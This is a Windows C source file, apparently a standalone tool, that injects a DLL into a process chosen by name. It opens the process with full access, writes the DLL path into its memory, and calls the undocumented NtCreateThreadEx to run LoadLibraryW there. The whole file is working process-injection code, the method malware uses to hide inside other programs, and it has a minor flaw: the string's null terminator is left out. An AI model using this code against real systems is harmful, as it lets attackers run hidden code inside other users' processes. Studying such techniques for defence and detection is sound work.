#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

typedef DWORD(WINAPI* prototype_NtCreateThreadEx)(
	PHANDLE                 ThreadHandle,
	ACCESS_MASK             DesiredAccess,
	LPVOID                  ObjectAttributes,
	HANDLE                  ProcessHandle,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	LPVOID                  lpParameter,
	BOOL                    CreateSuspended,
	DWORD                   dwStackSize,
	DWORD                   Unknown1,
	DWORD                   Unknown2,
	LPVOID                  Unknown3
	);

BOOL OpenRemoteProocess(LPWSTR lpProcessName, HANDLE* hProcess) {
	// DWORD dwDesiredAccess = PROCESS_VM_READ | PROCESS_VM_WRITE;
	DWORD dwDesiredAccess = PROCESS_ALL_ACCESS;
	PROCESSENTRY32	Process = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[ERROR] CreateToolhelp32Snapshot Failed");
		return FALSE;
	}

	if (!Process32First(hSnapShot, &Process)) {
		printf("[ERROR] Process32First Failed");
		return FALSE;
	}

	do {
		if (wcscmp(Process.szExeFile, lpProcessName) == 0) {
			DWORD dwProcessId = Process.th32ProcessID;
			*hProcess = OpenProcess(dwDesiredAccess, FALSE, Process.th32ProcessID);
			if (*hProcess == NULL) {
				printf("[ERROR] OpenProcess Failed");
				return FALSE;
			}
			printf("[INFO] %ls running with PID %d has been opened with 0x%x access mask! \n", lpProcessName, dwProcessId, dwDesiredAccess);
			return TRUE;
		}
	} while (Process32Next(hSnapShot, &Process));
	return FALSE;
}

BOOL NtCreateRemoteThreadInProcess(HANDLE hProcess, LPWSTR DllPath, LPWSTR lpProcessName) {
	LPVOID lpKernel32Handle = GetModuleHandle(L"kernel32.dll");
	if (lpKernel32Handle == NULL) {
		printf("[ERROR] Unable to get Handle of kernel32.dll. Exiting!");
		return FALSE;
	}
	printf("[INFO] Successfully opened handle to kernel32.dll\n");
	LPVOID lpLoadLibraryW = GetProcAddress(lpKernel32Handle, "LoadLibraryW");
	if (lpLoadLibraryW == NULL) {
		printf("[ERROR] Unable to get address of LoadLibraryW in kernel32.dll. Exiting!");
		return FALSE;
	}
	printf("[INFO] 0x%p.\n", lpLoadLibraryW);
	printf("[INFO] Successfully found the address of LoadLibraryW\n");
	LPVOID lpMemoryAddress = VirtualAllocEx(hProcess, NULL, lstrlenW(DllPath) * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpMemoryAddress == NULL) {
		printf("[ERROR] Unable to allocate %d bytes in %ls. Exiting!", lstrlenW(DllPath) * sizeof(WCHAR), lpProcessName);
		printf("%d", GetLastError());
		return FALSE;
	}
	printf("[INFO] Allocated %d bytes in %ls at 0x%x.\n", lstrlenW(DllPath) * sizeof(WCHAR), lpProcessName, lpMemoryAddress);
	SIZE_T szBytesWritten = NULL;
	if (!WriteProcessMemory(hProcess, lpMemoryAddress, DllPath, lstrlenW(DllPath) * sizeof(WCHAR), &szBytesWritten)) {
		printf("[ERROR] Unable to write %d bytes in %ls. Exiting!", lstrlenW(DllPath) * sizeof(WCHAR), lpProcessName);
		return FALSE;
	}
	if (szBytesWritten != lstrlenW(DllPath) * sizeof(WCHAR)) {
		printf("[ERROR] Unable to write %d bytes in %ls. Exiting!", lstrlenW(DllPath) * sizeof(WCHAR), lpProcessName);
		return FALSE;
	}
	printf("[INFO] Wrote %d bytes in %ls.\n", lstrlenW(DllPath) * sizeof(WCHAR), lpProcessName);
	
	prototype_NtCreateThreadEx pfnNtCreateThreadEx = NULL;
	PVOID pvEncodedPtr = NULL;

	HANDLE hThread = NULL;
	DWORD ThreadId = 0;

	LPVOID lpNtdllHandle = GetModuleHandle(L"ntdll.dll");
	if (lpNtdllHandle == NULL) {
		printf("[ERROR] Unable to get Handle of ntdll.dll. Exiting!");
		return FALSE;
	}
	printf("[INFO] Successfully opened handle to Ntdll.dll\n");
	LPVOID lpNtCreateRemoteThread = GetProcAddress(lpNtdllHandle, "NtCreateThreadEx");
	if (lpNtCreateRemoteThread == NULL) {
		printf("[ERROR] Unable to get address of NtCreateThreadEx in ntdll.dll. Exiting!");
		return FALSE;
	}
	pfnNtCreateThreadEx = lpNtCreateRemoteThread;
	pfnNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpLoadLibraryW, lpMemoryAddress, FALSE, NULL, NULL, NULL, NULL);
	if (hThread == NULL) {
		printf("[ERROR] Unable to create thread. Exiting!");
		return FALSE;
	}
	printf("[INFO] Executed the payload! \n");
	return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
	if (argc < 3) {
		printf("[INFO] Usage : %ls process_name dll_path\n", argv[0]);
		printf("[NOTE] process_name is case-sensitive");
		return -1;
	}

	HANDLE hProcess = NULL;

	if (!OpenRemoteProocess(argv[1], &hProcess)) {
		printf("[ERROR] Failed to open %ls process", argv[1]);
		return -1;
	}
	if (!NtCreateRemoteThreadInProcess(hProcess, argv[2], argv[1])) {
		return -1;
	}
}